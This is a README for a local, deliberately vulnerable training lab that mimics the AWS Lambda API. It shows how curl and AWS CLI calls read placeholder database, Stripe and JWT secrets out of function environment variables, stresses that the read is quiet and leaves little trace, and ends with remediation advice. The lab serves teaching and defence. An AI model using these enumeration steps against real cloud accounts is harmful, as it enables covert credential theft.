Cloud Lab 02. AWS-Lambda-Secret-Leak — Flask (Python), self-contained  ✅ (exploit verified on this box)

A minimal AWS Lambda control-plane API. The function prod-report-generator keeps
secrets (DB password, Stripe key, JWT signing key) in plaintext environment
variables. Anyone able to call ListFunctions / GetFunctionConfiguration — a very
common over-grant (e.g. lambda:GetFunction*) — reads them straight out of the
function configuration. No invoke required, so it leaves almost no trace.

1: Get the lab:   unzip AWS-Lambda-Secret-Leak.zip && cd 02-AWS-Lambda-Secret-Leak
2: Deploy (native — verified here):   ./run.sh        # (or: python3 app.py)  needs Flask
   Open in browser:   http://localhost:9132/          <-- {"app":"AWS Lambda (control plane...)",...}
   # Quick win — enumerate functions, then read the env-var secrets:
   curl -s localhost:9132/2015-03-31/functions/
   #   -> Functions: prod-report-generator, image-thumbnailer
   curl -s localhost:9132/2015-03-31/functions/prod-report-generator/configuration
   #   -> Environment.Variables: DB_PASSWORD=Lambda-Prod-DB-Pw-EXAMPLE!,
   #      STRIPE_SECRET_KEY=sk_live_..., JWT_SIGNING_KEY=...
   # AWS CLI equivalent (where awscli is installed):
   #   aws --endpoint-url http://localhost:9132 lambda list-functions
   #   aws --endpoint-url http://localhost:9132 lambda get-function-configuration \
   #       --function-name prod-report-generator
3: Stop:  Ctrl-C

Requirements:
    Python 3 + Flask                (native run — no Docker, no AWS account)
    curl                            (AWS CLI optional)

Endpoints (Lambda API shape):
    GET  /2015-03-31/functions/                          -> ListFunctions (incl. Environment)
    GET  /2015-03-31/functions/<name>/configuration      -> GetFunctionConfiguration  [SECRET LEAK]
    POST /2015-03-31/functions/<name>/invocations        -> Invoke (stub)

List of Vulnerabilities (all verified on this box):
    Secrets in Lambda environment variables — DB password, Stripe key, and JWT
        signing key stored in plaintext env vars.
    Over-broad read access — ListFunctions / GetFunctionConfiguration expose the
        Environment.Variables to anyone with function-read permissions.
    Silent exfiltration — reading configuration does not require invoking the
        function, so there is minimal execution footprint.

Remediation: store secrets in Secrets Manager / SSM Parameter Store (or KMS-
encrypted env with tight decrypt grants); restrict lambda:GetFunctionConfiguration
to least privilege; rotate leaked secrets.
